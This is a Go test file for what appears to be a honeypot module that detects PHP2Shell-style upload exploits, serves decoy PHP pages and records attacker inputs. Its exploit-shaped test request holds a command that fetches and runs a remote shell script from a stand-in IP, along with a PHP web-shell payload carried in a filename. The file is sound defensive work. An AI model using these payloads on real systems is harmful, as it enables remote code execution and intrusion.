package php2shell

import (
	"bytes"
	"fmt"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"

	"agenttrap/modules"
)

func req(r *http.Request, surface string) modules.Request {
	return modules.Request{Request: r, Surface: surface}
}

// exploitBody builds a multipart body shaped like the public PHP2Shell PoCs:
// an upload-progress field, many deeply nested names, and a file whose name
// carries PHP.
func exploitBody(t *testing.T) (*bytes.Buffer, string) {
	t.Helper()
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	_ = mw.WriteField("PHP_SESSION_UPLOAD_PROGRESS", "curl -s http://198.51.100.7/x.sh|sh")
	for i := range 120 {
		_ = mw.WriteField(fmt.Sprintf("files[R%05d][a][a][a]", i), "x")
	}
	fw, err := mw.CreateFormFile("f", "<?php system($_GET[c]); ?>")
	if err != nil {
		t.Fatal(err)
	}
	_, _ = fw.Write(bytes.Repeat([]byte("A"), 1000))
	_ = mw.Close()
	return &buf, mw.FormDataContentType()
}

func TestExploitRecognizedOnAnyHost(t *testing.T) {
	m := New()
	body, ct := exploitBody(t)
	r := httptest.NewRequest("POST", "https://www.demogpu.example/", body)
	r.Header.Set("Content-Type", ct)
	r.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: "abc"})
	if c := m.Claim(req(r, "www")); c != modules.Attack {
		t.Fatalf("claim = %v, want Attack", c)
	}
	w := httptest.NewRecorder()
	hit := m.Serve(w, req(r, "www"))
	if hit.Stage != modules.StageExploit || len(hit.CVE) != 2 {
		t.Fatalf("hit = %+v", hit)
	}
	for _, s := range []string{sigUploadProgress, sigNested, sigPHPFilename, sigSessionCookie} {
		if !slices.Contains(hit.Signals, s) {
			t.Errorf("missing signal %s in %v", s, hit.Signals)
		}
	}
	if w.Code != 200 || !strings.Contains(w.Body.String(), "Allowed memory size of 134217728 bytes exhausted") ||
		!strings.Contains(w.Body.String(), "<b>Unknown</b> on line <b>0</b>") {
		t.Fatalf("response %d %q", w.Code, w.Body.String())
	}
	if got := w.Header().Get("X-Powered-By"); got != "PHP/8.4.26" {
		t.Fatalf("X-Powered-By = %q", got)
	}
	vals, _ := hit.Detail["field_values"].([]string)
	if !slices.Contains(vals, "curl -s http://198.51.100.7/x.sh|sh") {
		t.Fatalf("payload command not captured: %v", hit.Detail)
	}
	if files, _ := hit.Detail["filenames"].([]string); len(files) != 1 {
		t.Fatalf("filenames = %v", hit.Detail["filenames"])
	}
}

func TestLongUrlencodedName(t *testing.T) {
	m := New()
	body := strings.Repeat("a", 70<<10) + "=1"
	r := httptest.NewRequest("POST", "http://203.0.113.9/", strings.NewReader(body))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	hit := m.Serve(httptest.NewRecorder(), req(r, ""))
	if hit.Stage != modules.StageExploit || !slices.Contains(hit.Signals, sigLongName) {
		t.Fatalf("hit = %+v", hit)
	}
}

func TestOrdinaryLoginIsNotAnExploit(t *testing.T) {
	m := New()
	r := httptest.NewRequest("POST", "http://203.0.113.9/index.php", strings.NewReader("username=admin&password=admin"))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if c := m.Claim(req(r, "www")); c != modules.Pass {
		t.Fatalf("plain form post on a persona host claimed: %v", c)
	}
	if c := m.Claim(req(r, "")); c != modules.Vhost {
		t.Fatalf("default vhost not claimed: %v", c)
	}
	w := httptest.NewRecorder()
	hit := m.Serve(w, req(r, ""))
	if hit.Stage != "" || w.Code != 200 || !strings.Contains(w.Body.String(), "Ops Portal") {
		t.Fatalf("hit = %+v code %d", hit, w.Code)
	}
	if vals, _ := hit.Detail["field_values"].([]string); !slices.Contains(vals, "admin") {
		t.Fatalf("form values not recorded: %v", hit.Detail)
	}
}

func TestDefaultVhostProbes(t *testing.T) {
	m := New()
	cases := []struct {
		path  string
		code  int
		stage string
		body  string
	}{
		{"/phpinfo.php", 200, modules.StageProbe, "PHP Version 8.4.26"},
		{"/", 200, "", "Ops Portal"},
		{"/wp-login.php", 404, "", "File not found."},
		{"/.env", 404, "", "nginx"},
	}
	for _, c := range cases {
		w := httptest.NewRecorder()
		hit := m.Serve(w, req(httptest.NewRequest("GET", "http://203.0.113.9"+c.path, nil), ""))
		if w.Code != c.code || hit.Stage != c.stage || !strings.Contains(w.Body.String(), c.body) {
			t.Errorf("%s: code %d stage %q body %.60q", c.path, w.Code, hit.Stage, w.Body.String())
		}
	}
	if !strings.Contains(phpinfo(), "session.upload_progress.enabled</td><td class=\"v\">On") {
		t.Fatal("phpinfo does not advertise upload progress")
	}
}

func TestPersonaHostLeftAlone(t *testing.T) {
	r := httptest.NewRequest("GET", "https://www.demogpu.example/phpinfo.php", nil)
	if c := New().Claim(req(r, "www")); c != modules.Pass {
		t.Fatalf("claim = %v", c)
	}
}
